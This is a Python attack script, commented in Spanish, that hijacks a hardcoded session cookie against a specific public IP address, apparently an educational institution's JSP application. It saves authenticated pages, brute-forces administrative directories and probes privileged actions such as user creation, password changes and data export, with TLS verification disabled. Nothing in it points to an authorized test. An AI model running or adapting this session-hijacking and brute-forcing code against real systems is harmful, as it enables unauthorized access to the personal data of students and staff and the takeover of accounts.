import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SessionExploiter:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"https://{target_ip}"
        self.session = requests.Session()
        self.session.verify = False
        # Usar la sesión activa que ya tenemos
        self.session.cookies.set('JSESSIONID', 'E79C9B62048BB93857B87CF6FAA56B6B')

    def explore_authenticated_area(self):
        """Explora el área autenticada a la que tenemos acceso"""
        print("[*] Explorando área autenticada...")
        
        # Páginas a las que tenemos acceso
        accessible_pages = [
            "/jsp/index.jsp",
            "/jsp/cerrar_sesion.jsp"
        ]
        
        for page in accessible_pages:
            try:
                url = f"{self.base_url}{page}"
                response = self.session.get(url, timeout=10)
                
                print(f"\n[+] Página: {page}")
                print(f"    Status: {response.status_code}")
                print(f"    Tamaño: {len(response.text)} bytes")
                
                # Analizar contenido
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Buscar información del usuario
                user_indicators = ['Bienvenido', 'Usuario:', 'User:', 'Hola', 'Welcome']
                for indicator in user_indicators:
                    if indicator in response.text:
                        print(f"    [!] Posible información de usuario: {indicator}")
                
                # Buscar enlaces interesantes
                links = soup.find_all('a', href=True)
                interesting_links = []
                for link in links:
                    href = link['href']
                    if any(keyword in href.lower() for keyword in 
                          ['admin', 'user', 'config', 'report', 'data', 'export']):
                        interesting_links.append(href)
                
                if interesting_links:
                    print(f"    [+] Enlaces interesantes: {interesting_links[:5]}")
                
                # Guardar página para análisis offline
                filename = f"auth_{page.replace('/', '_')}.html"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(response.text)
                print(f"    [+] Página guardada en {filename}")
                
            except Exception as e:
                print(f"[-] Error en {page}: {e}")

    def brute_force_directories_authenticated(self):
        """Fuerza bruta de directorios con sesión autenticada"""
        print("\n[*] Fuerza bruta de directorios autenticados...")
        
        admin_dirs = [
            "/jsp/admin/", "/jsp/administracion/", "/jsp/manager/", "/jsp/system/",
            "/jsp/config/", "/jsp/database/", "/jsp/reports/", "/jsp/backup/",
            "/jsp/users/", "/jsp/data/", "/jsp/export/", "/jsp/import/",
            "/admin/", "/administrator/", "/webadmin/", "/sysadmin/",
            "/jsp/escolar/admin/", "/jsp/escolar/config/", "/jsp/seguimiento_egreso/admin/"
        ]
        
        for directory in admin_dirs:
            try:
                url = f"{self.base_url}{directory}"
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200:
                    print(f"[!] ¡ACCESO CONCEDIDO: {directory}")
                    # Guardar contenido
                    filename = f"dir_{directory.replace('/', '_')}.html"
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write(response.text)
                elif response.status_code == 403:
                    print(f"[+] Acceso prohibido: {directory}")
                elif response.status_code == 404:
                    pass  # No mostrar 404s
                    
            except Exception as e:
                print(f"[-] Error en {directory}: {e}")

    def test_privileged_actions(self):
        """Prueba acciones privilegiadas con la sesión"""
        print("\n[*] Probando acciones privilegiadas...")
        
        # Acciones comunes en aplicaciones educativas
        actions = [
            "/jsp/escolar/generar_reporte.jsp",
            "/jsp/escolar/exportar_datos.jsp",
            "/jsp/admin/crear_usuario.jsp",
            "/jsp/admin/cambiar_password.jsp",
            "/jsp/config/parametros.jsp"
        ]
        
        for action in actions:
            try:
                url = f"{self.base_url}{action}"
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200:
                    print(f"[!] Acción accesible: {action}")
                    
                    # Probar enviar datos
                    if 'form' in response.text.lower():
                        print(f"    [+] Tiene formulario - posible explotación")
                        
            except Exception as e:
                print(f"[-] Error en {action}: {e}")

# Ejecutar explotación de sesión
print("=== EXPLOTACIÓN DE SESIÓN ACTIVA ===")
session_exploiter = SessionExploiter("189.254.143.102")
session_exploiter.explore_authenticated_area()
session_exploiter.brute_force_directories_authenticated()
session_exploiter.test_privileged_actions()